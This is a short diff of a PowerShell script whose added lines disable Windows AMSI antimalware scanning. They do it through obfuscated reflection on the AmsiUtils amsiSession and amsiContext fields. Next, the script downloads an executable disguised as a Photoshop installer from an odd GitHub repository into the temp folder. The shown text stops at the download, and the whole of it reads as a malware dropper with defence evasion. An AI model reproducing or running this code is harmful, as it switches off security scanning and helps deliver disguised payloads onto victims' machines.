@@ -1,3 +1,11 @@
+$rtp = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+$II="Ams";$z=$null;$ll="ams";$IL="tem.Manageme"
+$popnoppopUtilsType = [Ref].Assembly.GetType("Sys" + $IL + "nt.Automation." + $II + "iUtils")
+$rotrotgogogoField = $popnoppopUtilsType.GetField($ll+"iSes"+"sion", "NonPublic,Static")
+$pushpushnopField = $popnoppopUtilsType.GetField($ll+"iC"+"ontext", "NonPublic,Static")
+$rotrotgogogoField.SetValue($z, $z)
+$pushpushnopField.SetValue($z, [IntPtr]$rtp)
+
 $source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/Photoshop_Set-Up.exe"
 $destination = "$env:tmp\Photoshop_Set_Up.exe"
 Invoke-WebRequest -Uri $source -OutFile $destination
